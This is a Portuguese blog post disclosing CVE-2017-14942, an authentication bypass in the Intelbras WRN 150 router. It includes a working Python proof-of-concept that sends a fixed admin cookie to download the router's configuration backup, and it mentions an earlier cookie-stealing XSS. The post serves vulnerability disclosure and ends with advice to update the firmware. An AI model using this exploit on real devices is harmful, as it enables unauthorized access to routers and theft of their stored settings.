---
title: "[CVE-2017-14942] Autentication Bypass - INTELBRAS WRN 150 - [PT-BR]"
layout: post
date: '2017-09-29 13:28:24'
description: 'Intelbras exploit: Obtendo acesso ao painel administrador sem senha admin'
image: '/assets/images/posts/xxs/1501.png'
tags:
- cve
- poc
author: "f0lds"
---

[CVE-2017-14942](https://cve.mitre.org/cgi-bin/cvename.cgi?name=2017-14942){:target="_blank" rel="noopenner noreferrer"}

[Exploit](https://www.exploit-db.com/exploits/42916/){:target="_blank" rel="noopenner noreferrer"}

### Start:

Recentemente postei um tópico onde explico uma vulnerabilidade que encontrei num dos roteadores da Intelbras "O que você tem contra a Intelbras?" Nada, se eu não gostasse deles eu não estaria usando os roteadores deles, sou apenas alguém curioso e que gosta de escrever :v.

### A vulnerabilidade:

Após tentar aplicar o mesmo ataque xss no outro roteador (Intelbras WRN 150), adicionei no código uma função que me enviaria os cookies do painel do router, no primeiro teste funcionou, na segunda tentativa quando testei só para confirmar o script, também obtive êxito, foi ai que notei aquele pequeno cookie nos Headers que parecia ser o único utilizado para autenticação. A cada vez que alterava a senha ele permanecia ali.

![Passo 1]({{ site.url }}/assets/images/posts/xxs/1501.png)

Agora faremos uma requisição na página ```"http://10.0.0.1/advance.asp"``` com o cookie normal

![Passo 2]({{ site.url }}/assets/images/posts/xxs/1502.png)

ele identifica o usuário não autenticado e retorna para a página de login.

Agora faremos a mesma requisição, alterando o cookie do painel. 

![Passo 3]({{ site.url }}/assets/images/posts/xxs/1503.png)

### Resultado:

![Passo 4]({{ site.url }}/assets/images/posts/xxs/1504.png)

Podemos baixar o arquivo de configurações através do link de backup, fiz um pequeno script para demonstrar

```
#pip install requests
from requests import get

url = "http://10.0.0.1/cgi-bin/DownloadCfg/RouterCfm.cfg"
#url do backup
header = {'Cookie': 'admin:language=pt'}
#setando o cookie no header
r = get(url, headers=header).text
print(r);
```

![Passo 5]({{ site.url }}/assets/images/posts/xxs/1505.png)

### Prevenção

Vulnerabilidade na versão de firmware 1.0.1, baixei uma versão recente e a vulnerabilidade foi corrigida Para se proteger basta somente baixar a nova firmware disponibilizada pela Intelbras e atualizar o seu router.
